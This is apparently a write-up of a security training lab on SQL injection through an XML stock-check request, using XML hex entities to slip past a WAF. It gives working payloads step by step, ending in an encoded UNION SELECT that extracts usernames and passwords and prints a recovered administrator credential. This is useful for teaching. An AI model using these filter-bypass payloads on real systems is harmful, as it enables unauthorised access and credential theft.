XML is closely related to HTML and also supports character encoding using the same numeric escape sequences. This enables you to include special characters in the text content of elements without breaking the syntax, which can come in handy when testing for XSS via XML-based input, for example.

Even if you don't need to encode any special characters to avoid syntax errors, you can potentially take advantage of this behavior to obfuscate payloads in the same way as you do with HTML encoding. The difference is that your payload is decoded by the server itself, rather than client-side by a browser. This is useful for bypassing WAFs and other filters, which may block your requests if they detect certain keywords associated with SQL injection attacks.

XML-based SQL injection uses an XML escape sequence to encode the `S` character in `SELECT`:
 ```xml
 <stockCheck>
  <productId> 123 </productId>
  <storeId>
  999 &#x53;ELECT \* FROM information_schema.tables
</storeId>
</stockCheck>

````

# Lab: SQL injection with filter bypass via XML encoding

### step1
```xml
<stockCheck>
<productId>1</productId>
<storeId>
1
</storeId>
</stockCheck>
````

### step2

```xml
<stockCheck>
<productId>1</productId>
<storeId>
1+1
</storeId>
</stockCheck>
```

### step3

```sql
<stockCheck>
<productId>1</productId>
<storeId>
1 UNION SELECT NULL
</storeId>
</stockCheck>
```

### step4

```sql
<stockCheck>
<productId>1</productId>
<storeId>
<@hex_entities>
1 UNION SELECT username || '~' || password FROM users
<@/hex_entities>
</storeId>
</stockCheck>
```

administrator~mv28p7lrhcwmbk3feit0

note: to use `@hex_entities` you have to install extensions called `Hackvector`
**Extensions > Hackvertor > Encode > dec_entities/hex_entities**.
